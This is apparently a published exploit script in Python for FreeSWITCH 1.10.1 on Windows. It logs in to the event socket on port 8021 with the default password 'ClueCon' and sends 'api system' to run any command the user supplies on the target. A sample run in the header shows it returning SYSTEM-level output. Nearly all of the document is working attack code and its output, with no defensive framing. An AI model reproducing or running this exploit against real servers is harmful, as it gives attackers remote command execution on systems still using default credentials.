# Exploit Author: 1F98D
# Vendor Homepage: https://freeswitch.com/
# Software Link: https://files.freeswitch.org/windows/installer/x64/FreeSWITCH-1.10.1-Release-x64.msi
# Version: 1.10.1
# Tested on: Windows 10 (x64)
#
# FreeSWITCH listens on port 8021 by default and will accept and run commands sent to
# it after authenticating. By default commands are not accepted from remote hosts.
#
# -- Example --
# root@kali:~# ./freeswitch-exploit.py 192.168.1.100 whoami
# Authenticated
# Content-Type: api/response
# Content-Length: 20
#
# nt authority\system
# 

#!/usr/bin/python3

from socket import *
import sys

if len(sys.argv) != 3:
    print(&#039;Missing arguments&#039;)
    print(&#039;Usage: freeswitch-exploit.py <target> <cmd>&#039;)
    sys.exit(1)

ADDRESS=sys.argv[1]
CMD=sys.argv[2]
PASSWORD=&#039;ClueCon&#039; # default password for FreeSWITCH

s=socket(AF_INET, SOCK_STREAM)
s.connect((ADDRESS, 8021))

response = s.recv(1024)
if b&#039;auth/request&#039; in response:
    s.send(bytes(&#039;auth {}\n\n&#039;.format(PASSWORD), &#039;utf8&#039;))
    response = s.recv(1024)
    if b&#039;+OK accepted&#039; in response:
        print(&#039;Authenticated&#039;)
        s.send(bytes(&#039;api system {}\n\n&#039;.format(CMD), &#039;utf8&#039;))
        response = s.recv(8096).decode()
        print(response)
    else:
        print(&#039;Authentication failed&#039;)
        sys.exit(1)
else:
    print(&#039;Not prompted for authentication, likely not vulnerable&#039;)
    sys.exit(1)

